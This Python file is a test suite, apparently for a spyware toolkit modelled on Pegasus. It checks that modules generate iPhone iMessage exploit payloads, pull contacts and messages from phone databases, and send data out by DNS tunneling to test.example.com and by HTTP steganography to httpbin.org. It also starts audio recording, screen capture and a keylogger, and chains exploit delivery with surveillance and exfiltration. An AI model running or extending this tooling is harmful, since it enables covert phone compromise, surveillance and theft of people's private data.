#!/usr/bin/env python3
"""
Pegasus Test Suite
Comprehensive testing framework for enhanced Pegaspy capabilities
"""

import asyncio
import os
import sys
import time
import json
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import logging
import traceback

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import enhanced modules
try:
    from exploits.imessage_advanced import AdvancedIMessageExploit
    IMESSAGE_AVAILABLE = True
except ImportError:
    IMESSAGE_AVAILABLE = False
    print("⚠️ iMessage exploit module not available")

try:
    from data_exfiltration.exfil_engine import DataExfiltrationEngine
    EXFIL_AVAILABLE = True
except ImportError:
    EXFIL_AVAILABLE = False
    print("⚠️ Data exfiltration module not available")

try:
    from surveillance.realtime_monitor import RealtimeSurveillanceEngine
    SURVEILLANCE_AVAILABLE = True
except ImportError:
    SURVEILLANCE_AVAILABLE = False
    print("⚠️ Surveillance module not available")

class TestResult(Enum):
    PASS = "PASS"
    FAIL = "FAIL"
    SKIP = "SKIP"
    ERROR = "ERROR"

@dataclass
class TestCase:
    name: str
    description: str
    category: str
    result: TestResult
    execution_time: float
    details: str
    error_message: Optional[str] = None

class PegasusTestSuite:
    def __init__(self):
        self.test_results = []
        self.logger = self._setup_logging()
        self.start_time = None
        self.end_time = None
        
    def _setup_logging(self) -> logging.Logger:
        """Setup logging for test suite"""
        logger = logging.getLogger('pegasus_test_suite')
        logger.setLevel(logging.INFO)
        
        # Create logs directory if it doesn't exist
        os.makedirs('logs', exist_ok=True)
        
        # File handler
        file_handler = logging.FileHandler('logs/test_suite.log')
        file_handler.setLevel(logging.INFO)
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        
        # Formatter
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        file_handler.setFormatter(formatter)
        console_handler.setFormatter(formatter)
        
        logger.addHandler(file_handler)
        logger.addHandler(console_handler)
        return logger
    
    def _record_test(self, name: str, description: str, category: str, 
                    result: TestResult, execution_time: float, 
                    details: str, error_message: Optional[str] = None):
        """Record test result"""
        test_case = TestCase(
            name=name,
            description=description,
            category=category,
            result=result,
            execution_time=execution_time,
            details=details,
            error_message=error_message
        )
        self.test_results.append(test_case)
        
        # Log result
        status_emoji = {
            TestResult.PASS: "✅",
            TestResult.FAIL: "❌",
            TestResult.SKIP: "⏭️",
            TestResult.ERROR: "💥"
        }
        
        emoji = status_emoji.get(result, "❓")
        self.logger.info(f"{emoji} {name}: {result.value} ({execution_time:.2f}s)")
        
        if error_message:
            self.logger.error(f"   Error: {error_message}")
    
    async def test_imessage_exploits(self) -> bool:
        """Test iMessage exploit capabilities"""
        category = "iMessage Exploits"
        
        if not IMESSAGE_AVAILABLE:
            self._record_test(
                "iMessage Module Import",
                "Test iMessage exploit module availability",
                category,
                TestResult.SKIP,
                0.0,
                "iMessage module not available"
            )
            return False
        
        try:
            start_time = time.time()
            
            # Test 1: Initialize iMessage exploit
            exploit = AdvancedIMessageExploit()
            
            # Test 2: Generate CoreGraphics exploit
            coregraphics_payload = exploit.generate_coregraphics_exploit(
                target_device="iPhone",
                ios_version="15.0"
            )
            
            execution_time = time.time() - start_time
            
            if coregraphics_payload and len(coregraphics_payload) > 0:
                self._record_test(
                    "CoreGraphics Exploit Generation",
                    "Test CoreGraphics heap overflow exploit generation",
                    category,
                    TestResult.PASS,
                    execution_time,
                    f"Generated payload: {len(coregraphics_payload)} bytes"
                )
            else:
                self._record_test(
                    "CoreGraphics Exploit Generation",
                    "Test CoreGraphics heap overflow exploit generation",
                    category,
                    TestResult.FAIL,
                    execution_time,
                    "Failed to generate payload"
                )
                return False
            
            # Test 3: Generate ImageIO exploit
            start_time = time.time()
            imageio_payload = exploit.generate_imageio_exploit(
                target_device="iPhone",
                ios_version="14.8"
            )
            execution_time = time.time() - start_time
            
            if imageio_payload and len(imageio_payload) > 0:
                self._record_test(
                    "ImageIO Exploit Generation",
                    "Test ImageIO integer overflow exploit generation",
                    category,
                    TestResult.PASS,
                    execution_time,
                    f"Generated payload: {len(imageio_payload)} bytes"
                )
            else:
                self._record_test(
                    "ImageIO Exploit Generation",
                    "Test ImageIO integer overflow exploit generation",
                    category,
                    TestResult.FAIL,
                    execution_time,
                    "Failed to generate payload"
                )
                return False
            
            # Test 4: Generate notification exploit
            start_time = time.time()
            notification_payload = exploit.generate_notification_exploit(
                target_device="iPhone",
                ios_version="13.7"
            )
            execution_time = time.time() - start_time
            
            if notification_payload and len(notification_payload) > 0:
                self._record_test(
                    "Notification Exploit Generation",
                    "Test notification use-after-free exploit generation",
                    category,
                    TestResult.PASS,
                    execution_time,
                    f"Generated payload: {len(notification_payload)} bytes"
                )
            else:
                self._record_test(
                    "Notification Exploit Generation",
                    "Test notification use-after-free exploit generation",
                    category,
                    TestResult.FAIL,
                    execution_time,
                    "Failed to generate payload"
                )
                return False
            
            return True
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._record_test(
                "iMessage Exploit Test",
                "Test iMessage exploit functionality",
                category,
                TestResult.ERROR,
                execution_time,
                "Exception occurred during testing",
                str(e)
            )
            return False
    
    async def test_data_exfiltration(self) -> bool:
        """Test data exfiltration capabilities"""
        category = "Data Exfiltration"
        
        if not EXFIL_AVAILABLE:
            self._record_test(
                "Exfiltration Module Import",
                "Test data exfiltration module availability",
                category,
                TestResult.SKIP,
                0.0,
                "Data exfiltration module not available"
            )
            return False
        
        try:
            start_time = time.time()
            
            # Test 1: Initialize exfiltration engine
            engine = DataExfiltrationEngine()
            
            # Test 2: Test iOS contacts extraction
            ios_contacts = await engine.extract_ios_contacts("/tmp/test_contacts.db")
            
            execution_time = time.time() - start_time
            
            if ios_contacts is not None:
                self._record_test(
                    "iOS Contacts Extraction",
                    "Test iOS contacts database extraction",
                    category,
                    TestResult.PASS,
                    execution_time,
                    f"Extracted {len(ios_contacts)} contacts"
                )
            else:
                self._record_test(
                    "iOS Contacts Extraction",
                    "Test iOS contacts database extraction",
                    category,
                    TestResult.FAIL,
                    execution_time,
                    "Failed to extract contacts"
                )
            
            # Test 3: Test Android messages extraction
            start_time = time.time()
            android_messages = await engine.extract_android_messages("/tmp/test_messages.db")
            execution_time = time.time() - start_time
            
            if android_messages is not None:
                self._record_test(
                    "Android Messages Extraction",
                    "Test Android messages database extraction",
                    category,
                    TestResult.PASS,
                    execution_time,
                    f"Extracted {len(android_messages)} messages"
                )
            else:
                self._record_test(
                    "Android Messages Extraction",
                    "Test Android messages database extraction",
                    category,
                    TestResult.FAIL,
                    execution_time,
                    "Failed to extract messages"
                )
            
            # Test 4: Test DNS tunneling
            start_time = time.time()
            test_data = b"test_exfiltration_data"
            dns_result = await engine.exfiltrate_via_dns(test_data, "test.example.com")
            execution_time = time.time() - start_time
            
            if dns_result:
                self._record_test(
                    "DNS Tunneling",
                    "Test DNS tunneling exfiltration",
                    category,
                    TestResult.PASS,
                    execution_time,
                    f"Exfiltrated {len(test_data)} bytes via DNS"
                )
            else:
                self._record_test(
                    "DNS Tunneling",
                    "Test DNS tunneling exfiltration",
                    category,
                    TestResult.FAIL,
                    execution_time,
                    "DNS tunneling failed"
                )
            
            # Test 5: Test HTTP steganography
            start_time = time.time()
            http_result = await engine.exfiltrate_via_http_steganography(
                test_data, "https://httpbin.org/post"
            )
            execution_time = time.time() - start_time
            
            if http_result:
                self._record_test(
                    "HTTP Steganography",
                    "Test HTTP steganography exfiltration",
                    category,
                    TestResult.PASS,
                    execution_time,
                    f"Exfiltrated {len(test_data)} bytes via HTTP steganography"
                )
            else:
                self._record_test(
                    "HTTP Steganography",
                    "Test HTTP steganography exfiltration",
                    category,
                    TestResult.FAIL,
                    execution_time,
                    "HTTP steganography failed"
                )
            
            return True
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._record_test(
                "Data Exfiltration Test",
                "Test data exfiltration functionality",
                category,
                TestResult.ERROR,
                execution_time,
                "Exception occurred during testing",
                str(e)
            )
            return False
    
    async def test_surveillance_capabilities(self) -> bool:
        """Test surveillance capabilities"""
        category = "Surveillance"
        
        if not SURVEILLANCE_AVAILABLE:
            self._record_test(
                "Surveillance Module Import",
                "Test surveillance module availability",
                category,
                TestResult.SKIP,
                0.0,
                "Surveillance module not available"
            )
            return False
        
        try:
            start_time = time.time()
            
            # Test 1: Initialize surveillance engine
            engine = RealtimeSurveillanceEngine()
            
            # Test 2: Check capabilities
            capabilities = engine.get_capabilities()
            
            execution_time = time.time() - start_time
            
            available_capabilities = sum(1 for cap in capabilities.values() if cap)
            total_capabilities = len(capabilities)
            
            self._record_test(
                "Surveillance Capabilities Check",
                "Test surveillance engine capabilities",
                category,
                TestResult.PASS,
                execution_time,
                f"Available: {available_capabilities}/{total_capabilities} capabilities"
            )
            
            # Test 3: Audio surveillance
            start_time = time.time()
            audio_session = await engine.start_audio_surveillance(duration=2.0)
            execution_time = time.time() - start_time
            
            if audio_session:
                self._record_test(
                    "Audio Surveillance",
                    "Test audio surveillance session",
                    category,
                    TestResult.PASS,
                    execution_time,
                    f"Started audio session: {audio_session}"
                )
            else:
                self._record_test(
                    "Audio Surveillance",
                    "Test audio surveillance session",
                    category,
                    TestResult.FAIL,
                    execution_time,
                    "Failed to start audio session"
                )
            
            # Test 4: Screen capture
            start_time = time.time()
            screen_session = await engine.start_screen_surveillance(interval=1.0)
            execution_time = time.time() - start_time
            
            if screen_session:
                self._record_test(
                    "Screen Surveillance",
                    "Test screen capture surveillance",
                    category,
                    TestResult.PASS,
                    execution_time,
                    f"Started screen session: {screen_session}"
                )
            else:
                self._record_test(
                    "Screen Surveillance",
                    "Test screen capture surveillance",
                    category,
                    TestResult.FAIL,
                    execution_time,
                    "Failed to start screen session"
                )
            
            # Test 5: Keylogger
            start_time = time.time()
            keylog_session = await engine.start_keylogger_surveillance()
            execution_time = time.time() - start_time
            
            if keylog_session:
                self._record_test(
                    "Keylogger Surveillance",
                    "Test keylogger surveillance",
                    category,
                    TestResult.PASS,
                    execution_time,
                    f"Started keylogger session: {keylog_session}"
                )
            else:
                self._record_test(
                    "Keylogger Surveillance",
                    "Test keylogger surveillance",
                    category,
                    TestResult.FAIL,
                    execution_time,
                    "Failed to start keylogger session"
                )
            
            # Wait for surveillance data collection
            await asyncio.sleep(3)
            
            # Test 6: Stop all surveillance
            start_time = time.time()
            stopped_sessions = engine.stop_all_surveillance()
            execution_time = time.time() - start_time
            
            self._record_test(
                "Stop All Surveillance",
                "Test stopping all surveillance sessions",
                category,
                TestResult.PASS,
                execution_time,
                f"Stopped {stopped_sessions} sessions"
            )
            
            return True
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._record_test(
                "Surveillance Test",
                "Test surveillance functionality",
                category,
                TestResult.ERROR,
                execution_time,
                "Exception occurred during testing",
                str(e)
            )
            return False
    
    async def test_integration_scenarios(self) -> bool:
        """Test integration scenarios combining multiple capabilities"""
        category = "Integration"
        
        try:
            start_time = time.time()
            
            # Test 1: End-to-end exploit delivery and surveillance
            if IMESSAGE_AVAILABLE and SURVEILLANCE_AVAILABLE:
                # Generate exploit
                exploit = AdvancedIMessageExploit()
                payload = exploit.generate_coregraphics_exploit("iPhone", "15.0")
                
                # Start surveillance
                surveillance = RealtimeSurveillanceEngine()
                audio_session = await surveillance.start_audio_surveillance(duration=2.0)
                
                # Simulate exploit delivery and surveillance
                await asyncio.sleep(2)
                
                # Stop surveillance
                surveillance.stop_all_surveillance()
                
                execution_time = time.time() - start_time
                
                self._record_test(
                    "Exploit + Surveillance Integration",
                    "Test combined exploit delivery and surveillance",
                    category,
                    TestResult.PASS,
                    execution_time,
                    f"Generated {len(payload)} byte payload and ran surveillance"
                )
            else:
                self._record_test(
                    "Exploit + Surveillance Integration",
                    "Test combined exploit delivery and surveillance",
                    category,
                    TestResult.SKIP,
                    0.0,
                    "Required modules not available"
                )
            
            # Test 2: Surveillance and data exfiltration
            if SURVEILLANCE_AVAILABLE and EXFIL_AVAILABLE:
                start_time = time.time()
                
                # Start surveillance
                surveillance = RealtimeSurveillanceEngine()
                screen_session = await surveillance.start_screen_surveillance(interval=1.0)
                
                # Simulate data collection
                await asyncio.sleep(2)
                
                # Exfiltrate collected data
                exfil_engine = DataExfiltrationEngine()
                test_data = b"surveillance_data_sample"
                dns_result = await exfil_engine.exfiltrate_via_dns(test_data, "test.example.com")
                
                # Stop surveillance
                surveillance.stop_all_surveillance()
                
                execution_time = time.time() - start_time
                
                self._record_test(
                    "Surveillance + Exfiltration Integration",
                    "Test combined surveillance and data exfiltration",
                    category,
                    TestResult.PASS,
                    execution_time,
                    f"Collected surveillance data and exfiltrated {len(test_data)} bytes"
                )
            else:
                self._record_test(
                    "Surveillance + Exfiltration Integration",
                    "Test combined surveillance and data exfiltration",
                    category,
                    TestResult.SKIP,
                    0.0,
                    "Required modules not available"
                )
            
            return True
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._record_test(
                "Integration Test",
                "Test integration scenarios",
                category,
                TestResult.ERROR,
                execution_time,
                "Exception occurred during testing",
                str(e)
            )
            return False
    
    def generate_report(self) -> Dict:
        """Generate comprehensive test report"""
        total_tests = len(self.test_results)
        passed_tests = sum(1 for test in self.test_results if test.result == TestResult.PASS)
        failed_tests = sum(1 for test in self.test_results if test.result == TestResult.FAIL)
        skipped_tests = sum(1 for test in self.test_results if test.result == TestResult.SKIP)
        error_tests = sum(1 for test in self.test_results if test.result == TestResult.ERROR)
        
        total_execution_time = sum(test.execution_time for test in self.test_results)
        
        # Group by category
        categories = {}
        for test in self.test_results:
            if test.category not in categories:
                categories[test.category] = []
            categories[test.category].append(test)
        
        report = {
            'summary': {
                'total_tests': total_tests,
                'passed': passed_tests,
                'failed': failed_tests,
                'skipped': skipped_tests,
                'errors': error_tests,
                'success_rate': (passed_tests / total_tests * 100) if total_tests > 0 else 0,
                'total_execution_time': total_execution_time,
                'start_time': self.start_time.isoformat() if self.start_time else None,
                'end_time': self.end_time.isoformat() if self.end_time else None
            },
            'categories': {},
            'detailed_results': []
        }
        
        # Category summaries
        for category, tests in categories.items():
            cat_passed = sum(1 for test in tests if test.result == TestResult.PASS)
            cat_total = len(tests)
            
            report['categories'][category] = {
                'total': cat_total,
                'passed': cat_passed,
                'success_rate': (cat_passed / cat_total * 100) if cat_total > 0 else 0
            }
        
        # Detailed results
        for test in self.test_results:
            report['detailed_results'].append({
                'name': test.name,
                'description': test.description,
                'category': test.category,
                'result': test.result.value,
                'execution_time': test.execution_time,
                'details': test.details,
                'error_message': test.error_message
            })
        
        return report
    
    def save_report(self, filename: str = None):
        """Save test report to file"""
        if filename is None:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"pegasus_test_report_{timestamp}.json"
        
        report = self.generate_report()
        
        os.makedirs('reports', exist_ok=True)
        filepath = os.path.join('reports', filename)
        
        with open(filepath, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Test report saved to: {filepath}")
        return filepath
    
    def print_summary(self):
        """Print test summary to console"""
        report = self.generate_report()
        summary = report['summary']
        
        print("\n" + "=" * 60)
        print("🧪 PEGASUS TEST SUITE SUMMARY")
        print("=" * 60)
        
        print(f"\n📊 Overall Results:")
        print(f"   Total Tests: {summary['total_tests']}")
        print(f"   ✅ Passed: {summary['passed']}")
        print(f"   ❌ Failed: {summary['failed']}")
        print(f"   ⏭️ Skipped: {summary['skipped']}")
        print(f"   💥 Errors: {summary['errors']}")
        print(f"   📈 Success Rate: {summary['success_rate']:.1f}%")
        print(f"   ⏱️ Total Time: {summary['total_execution_time']:.2f}s")
        
        print(f"\n📂 Category Results:")
        for category, stats in report['categories'].items():
            print(f"   {category}: {stats['passed']}/{stats['total']} ({stats['success_rate']:.1f}%)")
        
        print(f"\n📝 Failed/Error Tests:")
        failed_tests = [test for test in self.test_results 
                       if test.result in [TestResult.FAIL, TestResult.ERROR]]
        
        if failed_tests:
            for test in failed_tests:
                status = "❌" if test.result == TestResult.FAIL else "💥"
                print(f"   {status} {test.name}: {test.details}")
                if test.error_message:
                    print(f"      Error: {test.error_message}")
        else:
            print("   🎉 No failed tests!")
        
        print("\n" + "=" * 60)
    
    async def run_all_tests(self):
        """Run all test suites"""
        self.start_time = datetime.now()
        
        print("🚀 Starting Pegasus Test Suite")
        print("=" * 50)
        
        # Test suites
        test_suites = [
            ("iMessage Exploits", self.test_imessage_exploits),
            ("Data Exfiltration", self.test_data_exfiltration),
            ("Surveillance", self.test_surveillance_capabilities),
            ("Integration", self.test_integration_scenarios)
        ]
        
        for suite_name, suite_func in test_suites:
            print(f"\n🧪 Running {suite_name} tests...")
            try:
                await suite_func()
            except Exception as e:
                self.logger.error(f"Test suite {suite_name} failed: {e}")
                traceback.print_exc()
        
        self.end_time = datetime.now()
        
        # Generate and save report
        report_file = self.save_report()
        
        # Print summary
        self.print_summary()
        
        print(f"\n📄 Detailed report saved to: {report_file}")

if __name__ == "__main__":
    async def main():
        test_suite = PegasusTestSuite()
        await test_suite.run_all_tests()
    
    asyncio.run(main())